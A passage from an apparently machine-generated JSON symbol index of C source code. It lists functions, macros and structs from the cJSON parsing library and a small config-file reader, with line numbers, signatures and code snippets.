size_t length; size_t offset; size_t depth; /* current nesting depth (for formatted printing) cJSON_bool noalloc; cJSON_bool format; /* is this print a formatted print internal_hooks hooks; } printbuffer; /* realloc printbuffer if necessary to have at least \"needed\" bytes more", "kind": "function", "line": 494, "name": "ensure", "signature": "static unsigned char* ensure(printbuffer * const p, size_t needed)"}, {"doc": "p->buffer = NULL; return NULL; } memcpy(newbuffer, p->buffer, p->offset + 1); p->hooks.deallocate(p->buffer); } p->length = newsize; p->buffer = newbuffer; return newbuffer + p->offset; } /* calculate the new length of the string in a printbuffer and update the offset", "kind": "function", "line": 579, "name": "update_offset", "signature": "static void update_offset(printbuffer * const buffer)"}, {"doc": "/* calculate the new length of the string in a printbuffer and update the offset static void update_offset(printbuffer * const buffer) { const unsigned char *buffer_pointer = NULL; if ((buffer == NULL) || (buffer->buffer == NULL)) { return; } buffer_pointer = buffer->buffer + buffer->offset; buffer->offset += strlen((const char*)buffer_pointer); } /* securely comparison of floating-point variables", "kind": "function", "line": 592, "name": "compare_double", "signature": "static cJSON_bool compare_double(double a, double b)"}, {"doc": "} buffer_pointer = buffer->buffer + buffer->offset; buffer->offset += strlen((const char*)buffer_pointer); } /* securely comparison of floating-point variables static cJSON_bool compare_double(double a, double b) { double maxVal = fabs(a) > fabs(b) ? fabs(a) : fabs(b); return (fabs(a - b) <= maxVal * DBL_EPSILON); } /* Render the number nicely from the given item into a string.", "kind": "function", "line": 599, "name": "print_number", "signature": "static cJSON_bool print_number(const cJSON * const item, printbuffer * const output_buffer)"}, {"doc": "output_pointer[i] = '.'; continue; } output_pointer[i] = number_buffer[i]; } output_pointer[i] = '\\0'; output_buffer->offset += (size_t)length; return true; } /* parse 4 digit hexadecimal number", "kind": "function", "line": 669, "name": "parse_hex4", "signature": "static unsigned parse_hex4(const unsigned char * const input)"}, {"doc": "converts a UTF-16 literal to UTF-8 * A literal can be one or two sequences of the form \\uXXXX", "kind": "function", "line": 706, "name": "utf16_literal_to_utf8", "signature": "static unsigned char utf16_literal_to_utf8(const unsigned char * const input_pointer, const unsig..."}, {"doc": "else { (*output_pointer)[0] = (unsigned char)(codepoint & 0x7F); } output_pointer += utf8_length; return sequence_length; fail: return 0; } /* Parse the input text into an unescaped cinput, and populate item.", "kind": "function", "line": 827, "name": "parse_string", "signature": "static cJSON_bool parse_string(cJSON * const item, parse_buffer * const input_buffer)"}, {"doc": "{ input_buffer->hooks.deallocate(output); output = NULL; } if (input_pointer != NULL) { input_buffer->offset = (size_t)(input_pointer - input_buffer->content); } return false; } /* Render the cstring provided to an escaped version that can be printed.", "kind": "function", "line": 957, "name": "print_string_ptr", "signature": "static cJSON_bool print_string_ptr(const unsigned char * const input, printbuffer * const output_..."}, {"doc": "/* escape and print as unicode codepoint sprintf((char*)output_pointer, \"u%04x\", *input_pointer); output_pointer += 4; break; } } } output[output_length + 1] = '\"'; output[output_length + 2] = '\\0'; return true; } /* Invoke print_string_ptr (which is useful) on an item.", "kind": "function", "line": 1079, "name": "print_string", "signature": "static cJSON_bool print_string(const cJSON * const item, printbuffer * const p)"}, {"doc": "static cJSON_bool print_string(const cJSON * const item, printbuffer * const p) { return print_string_ptr((unsigned char*)item->valuestring, p); } /* Predeclare these prototypes. static cJSON_bool parse_value(cJSON * const item, parse_buffer * const input_buffer); static cJSON_bool print_value(const cJSON * const item, printbuffer * const output_buffer); static cJSON_bool parse_array(cJSON * const item, parse_buffer * const input_buffer); static cJSON_bool print_array(const cJSON * const item, printbuffer * const output_buffer); static cJSON_bool parse_object(cJSON * const item, parse_buffer * const input_buffer); static cJSON_bool print_object(const cJSON * const item, printbuffer * const output_buffer); /* Utility to jump whitespace and cr/lf", "kind": "function", "line": 1093, "name": "buffer_skip_whitespace", "signature": "static parse_buffer *buffer_skip_whitespace(parse_buffer * const buffer)"}, {"doc": "while (can_access_at_index(buffer, 0) && (buffer_at_offset(buffer)[0] <= 32)) { buffer->offset++; } if (buffer->offset == buffer->length) { buffer->offset--; } return buffer; } /* skip the UTF-8 BOM (byte order mark) if it is at the beginning of a buffer", "kind": "function", "line": 1119, "name": "skip_utf8_bom", "signature": "static parse_buffer *skip_utf8_bom(parse_buffer * const buffer)"}, {"kind": "function", "line": 1133, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(cJSON *) cJSON_ParseWithOpts(const char *value, const char **return_parse_end, cJSON..."}, {"kind": "function", "line": 1235, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(cJSON *) cJSON_ParseWithLength(const char *value, size_t buffer_length)"}, {"doc": "define cjson_min(a, b) (((a) < (b)) ? (a) : (b))", "kind": "function", "line": 1242, "name": "print", "signature": "static unsigned char *print(const cJSON * const item, cJSON_bool format, const internal_hooks * c..."}, {"kind": "function", "line": 1315, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(char *) cJSON_PrintUnformatted(const cJSON *item)"}, {"kind": "function", "line": 1320, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(char *) cJSON_PrintBuffered(const cJSON *item, int prebuffer, cJSON_bool fmt)"}, {"kind": "function", "line": 1351, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(cJSON_bool) cJSON_PrintPreallocated(cJSON *item, char *buffer, const int length, con..."}, {"doc": "return false; } p.buffer = (unsigned char*)buffer; p.length = (size_t)length; p.offset = 0; p.noalloc = true; p.format = format; p.hooks = global_hooks; return print_value(item, &p); } /* Parser core - when encountering text, process appropriately.", "kind": "function", "line": 1372, "name": "parse_value", "signature": "static cJSON_bool parse_value(cJSON * const item, parse_buffer * const input_buffer)"}, {"doc": "if (can_access_at_index(input_buffer, 0) && (buffer_at_offset(input_buffer)[0] == '[')) { return parse_array(item, input_buffer); } /* object if (can_access_at_index(input_buffer, 0) && (buffer_at_offset(input_buffer)[0] == '{')) { return parse_object(item, input_buffer); } return false; } /* Render a value to text.", "kind": "function", "line": 1427, "name": "print_value", "signature": "static cJSON_bool print_value(const cJSON * const item, printbuffer * const output_buffer)"}, {"doc": "return print_string(item, output_buffer); case cJSON_Array: return print_array(item, output_buffer); case cJSON_Object: return print_object(item, output_buffer); default: return false; } } /* Build an array from input text.", "kind": "function", "line": 1501, "name": "parse_array", "signature": "static cJSON_bool parse_array(cJSON * const item, parse_buffer * const input_buffer)"}, {"doc": "input_buffer->offset++; return true; fail: if (head != NULL) { cJSON_Delete(head); } return false; } /* Render an array to text", "kind": "function", "line": 1599, "name": "print_array", "signature": "static cJSON_bool print_array(const cJSON * const item, printbuffer * const output_buffer)"}, {"doc": "output_pointer = ensure(output_buffer, 2); if (output_pointer == NULL) { return false; } output_pointer++ = ']'; output_pointer = '\\0'; output_buffer->depth--; return true; } /* Build an object from the text.", "kind": "function", "line": 1661, "name": "parse_object", "signature": "static cJSON_bool parse_object(cJSON * const item, parse_buffer * const input_buffer)"}, {"doc": "input_buffer->offset++; return true; fail: if (head != NULL) { cJSON_Delete(head); } return false; } /* Render an object to text.", "kind": "function", "line": 1780, "name": "print_object", "signature": "static cJSON_bool print_object(const cJSON * const item, printbuffer * const output_buffer)"}, {"kind": "function", "line": 1915, "name": "get_array_item", "signature": "static cJSON* get_array_item(const cJSON *array, size_t index)"}, {"kind": "function", "line": 1934, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(cJSON *) cJSON_GetArrayItem(const cJSON *array, int index)"}, {"kind": "function", "line": 1944, "name": "get_object_item", "signature": "static cJSON *get_object_item(const cJSON * const object, const char * const name, const cJSON_bo..."}, {"kind": "function", "line": 1976, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(cJSON *) cJSON_GetObjectItem(const cJSON * const object, const char * const string)"}, {"kind": "function", "line": 1981, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(cJSON *) cJSON_GetObjectItemCaseSensitive(const cJSON * const object, const char * c..."}, {"kind": "function", "line": 1986, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(cJSON_bool) cJSON_HasObjectItem(const cJSON *object, const char *string)"}, {"doc": "return get_object_item(object, string, false); } CJSON_PUBLIC(cJSON *) cJSON_GetObjectItemCaseSensitive(const cJSON * const object, const char * const string) { return get_object_item(object, string, true); } CJSON_PUBLIC(cJSON_bool) cJSON_HasObjectItem(const cJSON *object, const char *string) { return cJSON_GetObjectItem(object, string) ? 1 : 0; } /* Utility for array list handling.", "kind": "function", "line": 1993, "name": "suffix_object", "signature": "static void suffix_object(cJSON *prev, cJSON *item)"}, {"doc": "CJSON_PUBLIC(cJSON_bool) cJSON_HasObjectItem(const cJSON *object, const char *string) { return cJSON_GetObjectItem(object, string) ? 1 : 0; } /* Utility for array list handling. static void suffix_object(cJSON *prev, cJSON *item) { prev->next = item; item->prev = prev; } /* Utility for handling references.", "kind": "function", "line": 2000, "name": "create_reference", "signature": "static cJSON *create_reference(const cJSON *item, const internal_hooks * const hooks)"}, {"kind": "function", "line": 2020, "name": "add_item_to_array", "signature": "static cJSON_bool add_item_to_array(cJSON *array, cJSON *item)"}, {"doc": "/* Add item to array/object. CJSON_PUBLIC(cJSON_bool) cJSON_AddItemToArray(cJSON *array, cJSON *item) { return add_item_to_array(array, item); } #if defined(__clang__) || (defined(__GNUC__) && ((__GNUC__ > 4) || ((__GNUC__ == 4) && (__GNUC__-MINOR__ > 5)))) #pragma GCC diagnostic push #endif #ifdef __GNUC__ #pragma GCC diagnostic ignored \"-Wcast-qual\" #endif /* helper function to cast away const", "kind": "function", "line": 2066, "name": "cast_away_const", "signature": "static void* cast_away_const(const void* string)"}, {"doc": "if defined(__clang__) || (defined(__GNUC__) && ((__GNUC__ > 4) || ((__GNUC__ == 4) && (__GNUC__-MINOR__ > 5)))) pragma GCC diagnostic pop endif", "kind": "function", "line": 2073, "name": "add_item_to_object", "signature": "static cJSON_bool add_item_to_object(cJSON * const object, const char * const string, cJSON * con..."}, {"kind": "function", "line": 2111, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(cJSON_bool) cJSON_AddItemToObject(cJSON *object, const char *string, cJSON *item)"}, {"kind": "function", "line": 2122, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(cJSON_bool) cJSON_AddItemReferenceToArray(cJSON *array, cJSON *item)"}, {"kind": "function", "line": 2132, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(cJSON_bool) cJSON_AddItemReferenceToObject(cJSON *object, const char *string, cJSON ..."}, {"kind": "function", "line": 2142, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(cJSON*) cJSON_AddNullToObject(cJSON * const object, const char * const name)"}, {"kind": "function", "line": 2154, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(cJSON*) cJSON_AddTrueToObject(cJSON * const object, const char * const name)"}, {"kind": "function", "line": 2166, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(cJSON*) cJSON_AddFalseToObject(cJSON * const object, const char * const name)"}, {"kind": "function", "line": 2178, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(cJSON*) cJSON_AddBoolToObject(cJSON * const object, const char * const name, const c..."}, {"kind": "function", "line": 2190, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(cJSON*) cJSON_AddNumberToObject(cJSON * const object, const char * const name, const..."}, {"kind": "function", "line": 2202, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(cJSON*) cJSON_AddStringToObject(cJSON * const object, const char * const name, const..."}, {"kind": "function", "line": 2214, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(cJSON*) cJSON_AddRawToObject(cJSON * const object, const char * const name, const ch..."}, {"kind": "function", "line": 2226, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(cJSON*) cJSON_AddObjectToObject(cJSON * const object, const char * const name)"}, {"kind": "function", "line": 2238, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(cJSON*) cJSON_AddArrayToObject(cJSON * const object, const char * const name)"}, {"kind": "function", "line": 2250, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(cJSON *) cJSON_DetachItemViaPointer(cJSON *parent, cJSON * const item)"}, {"kind": "function", "line": 2286, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(cJSON *) cJSON_DetachItemFromArray(cJSON *array, int which)"}, {"kind": "function", "line": 2296, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(void) cJSON_DeleteItemFromArray(cJSON *array, int which)"}, {"kind": "function", "line": 2301, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(cJSON *) cJSON_DetachItemFromObject(cJSON *object, const char *string)"}, {"kind": "function", "line": 2308, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(cJSON *) cJSON_DetachItemFromObjectCaseSensitive(cJSON *object, const char *string)"}, {"kind": "function", "line": 2315, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(void) cJSON_DeleteItemFromObject(cJSON *object, const char *string)"}, {"kind": "function", "line": 2320, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(void) cJSON_DeleteItemFromObjectCaseSensitive(cJSON *object, const char *string)"}, {"kind": "function", "line": 2362, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(cJSON_bool) cJSON_ReplaceItemViaPointer(cJSON * const parent, cJSON * const item, cJ..."}, {"kind": "function", "line": 2412, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(cJSON_bool) cJSON_ReplaceItemInArray(cJSON *array, int which, cJSON *newitem)"}, {"kind": "function", "line": 2422, "name": "replace_item_in_object", "signature": "static cJSON_bool replace_item_in_object(cJSON *object, const char *string, cJSON *replacement, c..."}, {"kind": "function", "line": 2445, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(cJSON_bool) cJSON_ReplaceItemInObject(cJSON *object, const char *string, cJSON *newi..."}, {"kind": "function", "line": 2450, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(cJSON_bool) cJSON_ReplaceItemInObjectCaseSensitive(cJSON *object, const char *string..."}, {"kind": "function", "line": 2467, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(cJSON *) cJSON_CreateTrue(void)"}, {"kind": "function", "line": 2478, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(cJSON *) cJSON_CreateFalse(void)"}, {"kind": "function", "line": 2489, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(cJSON *) cJSON_CreateBool(cJSON_bool boolean)"}, {"kind": "function", "line": 2500, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(cJSON *) cJSON_CreateNumber(double num)"}, {"kind": "function", "line": 2525, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(cJSON *) cJSON_CreateString(const char *string)"}, {"kind": "function", "line": 2542, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(cJSON *) cJSON_CreateStringReference(const char *string)"}, {"kind": "function", "line": 2554, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(cJSON *) cJSON_CreateObjectReference(const cJSON *child)"}, {"kind": "function", "line": 2566, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(cJSON *) cJSON_CreateArrayReference(const cJSON *child)"}, {"kind": "function", "line": 2578, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(cJSON *) cJSON_CreateRaw(const char *raw)"}, {"kind": "function", "line": 2595, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(cJSON *) cJSON_CreateArray(void)"}, {"kind": "function", "line": 2606, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(cJSON *) cJSON_CreateObject(void)"}, {"kind": "function", "line": 2658, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(cJSON *) cJSON_CreateFloatArray(const float *numbers, int count)"}, {"kind": "function", "line": 2698, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(cJSON *) cJSON_CreateDoubleArray(const double *numbers, int count)"}, {"kind": "function", "line": 2738, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(cJSON *) cJSON_CreateStringArray(const char *const *strings, int count)"}, {"kind": "function", "line": 2785, "name": "cJSON_Duplicate_rec", "signature": "cJSON * cJSON_Duplicate_rec(const cJSON *item, size_t depth, cJSON_bool recurse)"}, {"kind": "function", "line": 2872, "name": "skip_oneline_comment", "signature": "static void skip_oneline_comment(char **input)"}, {"kind": "function", "line": 2885, "name": "skip_multiline_comment", "signature": "static void skip_multiline_comment(char **input)"}, {"kind": "function", "line": 2899, "name": "minify_string", "signature": "static void minify_string(char **input, char **output)"}, {"kind": "function", "line": 2921, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(void) cJSON_Minify(char *json)"}, {"kind": "function", "line": 2971, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(cJSON_bool) cJSON_IsInvalid(const cJSON * const item)"}, {"kind": "function", "line": 2981, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(cJSON_bool) cJSON_IsFalse(const cJSON * const item)"}, {"kind": "function", "line": 2991, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(cJSON_bool) cJSON_IsTrue(const cJSON * const item)"}, {"kind": "function", "line": 3001, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(cJSON_bool) cJSON_IsBool(const cJSON * const item)"}, {"kind": "function", "line": 3011, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(cJSON_bool) cJSON_IsNull(const cJSON * const item)"}, {"kind": "function", "line": 3021, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(cJSON_bool) cJSON_IsNumber(const cJSON * const item)"}, {"kind": "function", "line": 3031, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(cJSON_bool) cJSON_IsString(const cJSON * const item)"}, {"kind": "function", "line": 3041, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(cJSON_bool) cJSON_IsArray(const cJSON * const item)"}, {"kind": "function", "line": 3051, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(cJSON_bool) cJSON_IsObject(const cJSON * const item)"}, {"kind": "function", "line": 3061, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(cJSON_bool) cJSON_IsRaw(const cJSON * const item)"}, {"kind": "function", "line": 3071, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(cJSON_bool) cJSON_Compare(const cJSON * const a, const cJSON * const b, const cJSON_..."}, {"kind": "function", "line": 3157, "name": "cJSON_ArrayForEach", "signature": "cJSON_ArrayForEach(a_element, a)"}, {"doc": "doing this twice, once on a and b to prevent true comparison if a subset of b * TODO: Do this the proper way, this is just a fix for now", "kind": "function", "line": 3173, "name": "cJSON_ArrayForEach", "signature": "cJSON_ArrayForEach(b_element, b)"}, {"kind": "function", "line": 3193, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(void *) cJSON_malloc(size_t size)"}, {"kind": "function", "line": 3198, "name": "CJSON_PUBLIC", "signature": "CJSON_PUBLIC(void) cJSON_free(void *object)"}, {"kind": "function", "line": 128, "name": "sprintf", "signature": "sprintf(version, \"%i.%i.%i\", CJSON_VERSION_MAJOR, CJSON_VERSION_MINOR, CJSON_VERSION_PATCH);"}, {"kind": "function", "line": 153, "name": "tolower", "signature": "return tolower(*string1) - tolower(*string2);"}, {"kind": "function", "line": 160, "name": "void", "signature": "void (CJSON_CDECL *deallocate)(void *pointer);"}, {"kind": "function", "line": 168, "name": "malloc", "signature": "return malloc(size);"}, {"kind": "function", "line": 172, "name": "free", "signature": "free(pointer);"}, {"kind": "function", "line": 176, "name": "realloc", "signature": "return realloc(pointer, size);"}, {"kind": "function", "line": 205, "name": "memcpy", "signature": "memcpy(copy, string, length);"}, {"kind": "function", "line": 247, "name": "memset", "signature": "memset(node, '\\0', sizeof(cJSON));"}, {"kind": "function", "line": 262, "name": "cJSON_Delete", "signature": "cJSON_Delete(item->child);"}, {"kind": "function", "line": 464, "name": "strcpy", "signature": "strcpy(object->valuestring, valuestring);"}, {"kind": "function", "line": 475, "name": "cJSON_free", "signature": "cJSON_free(object->valuestring);"}, {"kind": "function", "line": 1145, "name": "cJSON_ParseWithLengthOpts", "signature": "return cJSON_ParseWithLengthOpts(value, buffer_length, return_parse_end, require_null_terminated);"}, {"kind": "function", "line": 1233, "name": "cJSON_ParseWithOpts", "signature": "return cJSON_ParseWithOpts(value, 0, 0);"}, {"kind": "function", "line": 2293, "name": "cJSON_DetachItemViaPointer", "signature": "return cJSON_DetachItemViaPointer(array, get_array_item(array, (size_t)which));"}, {"kind": "function", "line": 2419, "name": "cJSON_ReplaceItemViaPointer", "signature": "return cJSON_ReplaceItemViaPointer(array, get_array_item(array, (size_t)which), newitem);"}, {"kind": "macro", "line": 28, "name": "_CRT_SECURE_NO_DEPRECATE", "signature": "#define _CRT_SECURE_NO_DEPRECATE"}, {"kind": "macro", "line": 65, "name": "true", "signature": "#define true"}, {"kind": "macro", "line": 70, "name": "false", "signature": "#define false"}, {"kind": "macro", "line": 74, "name": "isinf", "signature": "#define isinf(d)"}, {"kind": "macro", "line": 77, "name": "isnan", "signature": "#define isnan(d)"}, {"kind": "macro", "line": 82, "name": "NAN", "signature": "#define NAN"}, {"kind": "macro", "line": 84, "name": "NAN", "signature": "#define NAN"}, {"kind": "macro", "line": 179, "name": "internal_malloc", "signature": "#define internal_malloc"}, {"kind": "macro", "line": 180, "name": "internal_free", "signature": "#define internal_free"}, {"kind": "macro", "line": 181, "name": "internal_realloc", "signature": "#define internal_realloc"}, {"kind": "macro", "line": 185, "name": "static_strlen", "signature": "#define static_strlen(string_literal)"}, {"kind": "macro", "line": 301, "name": "can_read", "signature": "#define can_read(buffer, size)"}, {"kind": "macro", "line": 303, "name": "can_access_at_index", "signature": "#define can_access_at_index(buffer, index)"}, {"kind": "macro", "line": 304, "name": "cannot_access_at_index", "signature": "#define cannot_access_at_index(buffer, index)"}, {"kind": "macro", "line": 306, "name": "buffer_at_offset", "signature": "#define buffer_at_offset(buffer)"}, {"kind": "macro", "line": 1240, "name": "cjson_min", "signature": "#define cjson_min(a, b)"}]}, {"id": "include/cJSON.h", "kind": "module", "label": "cJSON.h", "language": "h", "sha256": "440ea01ccb15d9e7", "symbol_count": 38, "symbols": [{"doc": "#define cJSON_Invalid (0) #define cJSON_False  (1 << 0) #define cJSON_True   (1 << 1) #define cJSON_NULL   (1 << 2) #define cJSON_Number (1 << 3) #define cJSON_String (1 << 4) #define cJSON_Array  (1 << 5) #define cJSON_Object (1 << 6) #define cJSON_Raw    (1 << 7) /* raw json #define cJSON_IsReference 256 #define cJSON_StringIsConst 512 /* The cJSON structure:", "kind": "struct", "line": 92, "name": "cJSON"}, {"kind": "struct", "line": 114, "name": "cJSON_Hooks"}, {"kind": "type_alias", "line": 120, "name": "cJSON_bool", "signature": "typedef int cJSON_bool;"}, {"kind": "function", "line": 118, "name": "void", "signature": "void (CJSON_CDECL *free_fn)(void *ptr);"}, {"kind": "function", "line": 249, "name": "sensitive", "signature": "* case_sensitive determines if object keys are treated case sensitive (1) or case insensitive (0) */ CJSON_PUBLIC(cJSON_bool) cJSON_Compare(const cJSON * const a, const cJSON * const b, const cJSON_bo"}, {"doc": "ifdef __cplusplus", "kind": "variable", "line": 27, "name": "next", "signature": "extern \"C\" { #endif #if !defined(__WINDOWS__) && (defined(WIN32) || defined(WIN64) || defined(_MSC_VER) || defined(_WIN32)) #define __WINDOWS__ #endif #ifdef __WINDOWS__ /* When compiling for windows,"}, {"kind": "macro", "line": 24, "name": "cJSON__h", "signature": "#define cJSON__h"}, {"kind": "macro", "line": 32, "name": "__WINDOWS__", "signature": "#define __WINDOWS__"}, {"kind": "macro", "line": 43, "name": "CJSON_CDECL", "signature": "#define CJSON_CDECL"}, {"kind": "macro", "line": 45, "name": "CJSON_STDCALL", "signature": "#define CJSON_STDCALL"}, {"kind": "macro", "line": 49, "name": "CJSON_EXPORT_SYMBOLS", "signature": "#define CJSON_EXPORT_SYMBOLS"}, {"kind": "macro", "line": 53, "name": "CJSON_PUBLIC", "signature": "#define CJSON_PUBLIC(type)"}, {"kind": "macro", "line": 55, "name": "CJSON_PUBLIC", "signature": "#define CJSON_PUBLIC(type)"}, {"kind": "macro", "line": 57, "name": "CJSON_PUBLIC", "signature": "#define CJSON_PUBLIC(type)"}, {"kind": "macro", "line": 60, "name": "CJSON_CDECL", "signature": "#define CJSON_CDECL"}, {"kind": "macro", "line": 61, "name": "CJSON_STDCALL", "signature": "#define CJSON_STDCALL"}, {"kind": "macro", "line": 64, "name": "CJSON_PUBLIC", "signature": "#define CJSON_PUBLIC(type)"}, {"kind": "macro", "line": 66, "name": "CJSON_PUBLIC", "signature": "#define CJSON_PUBLIC(type)"}, {"kind": "macro", "line": 71, "name": "CJSON_VERSION_MAJOR", "signature": "#define CJSON_VERSION_MAJOR"}, {"kind": "macro", "line": 72, "name": "CJSON_VERSION_MINOR", "signature": "#define CJSON_VERSION_MINOR"}, {"kind": "macro", "line": 73, "name": "CJSON_VERSION_PATCH", "signature": "#define CJSON_VERSION_PATCH"}, {"kind": "macro", "line": 78, "name": "cJSON_Invalid", "signature": "#define cJSON_Invalid"}, {"kind": "macro", "line": 79, "name": "cJSON_False", "signature": "#define cJSON_False"}, {"kind": "macro", "line": 80, "name": "cJSON_True", "signature": "#define cJSON_True"}, {"kind": "macro", "line": 81, "name": "cJSON_NULL", "signature": "#define cJSON_NULL"}, {"kind": "macro", "line": 82, "name": "cJSON_Number", "signature": "#define cJSON_Number"}, {"kind": "macro", "line": 83, "name": "cJSON_String", "signature": "#define cJSON_String"}, {"kind": "macro", "line": 84, "name": "cJSON_Array", "signature": "#define cJSON_Array"}, {"kind": "macro", "line": 85, "name": "cJSON_Object", "signature": "#define cJSON_Object"}, {"kind": "macro", "line": 86, "name": "cJSON_Raw", "signature": "#define cJSON_Raw"}, {"kind": "macro", "line": 87, "name": "cJSON_IsReference", "signature": "#define cJSON_IsReference"}, {"kind": "macro", "line": 89, "name": "cJSON_StringIsConst", "signature": "#define cJSON_StringIsConst"}, {"kind": "macro", "line": 126, "name": "CJSON_NESTING_LIMIT", "signature": "#define CJSON_NESTING_LIMIT"}, {"kind": "macro", "line": 132, "name": "CJSON_CIRCULAR_LIMIT", "signature": "#define CJSON_CIRCULAR_LIMIT"}, {"kind": "macro", "line": 270, "name": "cJSON_SetIntValue", "signature": "#define cJSON_SetIntValue(object, number)"}, {"kind": "macro", "line": 273, "name": "cJSON_SetNumberValue", "signature": "#define cJSON_SetNumberValue(object, number)"}, {"kind": "macro", "line": 278, "name": "cJSON_SetBoolValue", "signature": "#define cJSON_SetBoolValue(object, boolValue)"}, {"kind": "macro", "line": 285, "name": "cJSON_ArrayForEach", "signature": "#define cJSON_ArrayForEach(element, array)"}]}, {"id": "include/config.c", "kind": "module", "label": "config.c", "language": "c", "sha256": "0f4b0e25f159803e", "symbol_count": 25, "symbols": [{"doc": "declared in the schema. Unknown keys are skipped. Missing sections fall back to safe defaults.  #define _POSIX_C_SOURCE 200809L #include \"config.h\" #include <stdio.h> #include <stdlib.h> #include <string.h> #include <ctype.h> #include <time.h> #include <unistd.h> #include <limits.h> /* --- file slurper ---", "kind": "function", "line": 24, "name": "slurp", "signature": "static char *slurp(const char *path, size_t *out_len)"}, {"doc": "fseek(f, 0, SEEK_END); long n = ftell(f); fseek(f, 0, SEEK_SET); if (n < 0) { fclose(f); return NULL; } char *buf = (char *)malloc((size_t)n + 1); if (!buf) { fclose(f); return NULL; } if (fread(buf, 1, (size_t)n, f) != (size_t)n) { fclose(f); free(buf); return NULL; } buf[n] = '\\0'; fclose(f); out_len = (size_t)n; return buf; } /* --- lexer-style cursor helpers ---", "kind": "function", "line": 41, "name": "skip_ws", "signature": "static const char *skip_ws(const char *p, const char *end)"}, {"doc": "Read a JSON string starting at *pp (which must point at \"). On success, write the unescaped string into out (NUL terminated) * and advance *pp past the closing quote.", "kind": "function", "line": 49, "name": "read_string", "signature": "static int read_string(const char **pp, const char *end, char *out, size_t outsz)"}, {"kind": "function", "line": 75, "name": "read_int", "signature": "static int read_int(const char **pp, const char *end, int *out)"}, {"kind": "function", "line": 91, "name": "read_bool", "signature": "static int read_bool(const char **pp, const char *end, int *out)"}, {"doc": "} out = (int)(neg ? -v : v); pp = p; return 1; } static int read_bool(const char **pp, const char *end, int *out) { const char *p = skip_ws(*pp, end); if ((end - p) >= 4 && !memcmp(p, \"true\", 4)) { *out = 1; *pp = p + 4; return 1; } if ((end - p) >= 5 && !memcmp(p, \"false\", 5)) { *out = 0; *pp = p + 5; return 1; } return 0; } /* Expect the literal byte c.", "kind": "function", "line": 100, "name": "expect", "signature": "static int expect(const char **pp, const char *end, char c)"}, {"doc": "Find the byte position of the matching closing brace for the * opening { at *pp. Honors string and escape rules.", "kind": "function", "line": 109, "name": "find_matching_brace", "signature": "static const char *find_matching_brace(const char *p, const char *end)"}, {"doc": "Skip the next value at p (string, number, bool, null, object, array). * Returns the position just past the value, or NULL on error.", "kind": "function", "line": 132, "name": "skip_value", "signature": "static const char *skip_value(const char *p, const char *end)"}, {"doc": "else if (ch == ']') { depth--; if (depth == 0) return p + 1; } p++; } return NULL; } if (c == 't') return p + 4; if (c == 'f') return p + 5; if (c == 'n') return p + 4; /* number while (p < end && (*p == '-' || isdigit((unsigned char)*p) || *p == '.' || *p == 'e' || *p == 'E' || *p == '+')) p++; return p; } /* --- hex decode ---", "kind": "function", "line": 174, "name": "hex_to_bytes", "signature": "static int hex_to_bytes(const char *hex, uint8_t *out, size_t outlen)"}, {"doc": "/* --- hex decode --- static int hex_to_bytes(const char *hex, uint8_t *out, size_t outlen) { size_t hlen = strlen(hex); if 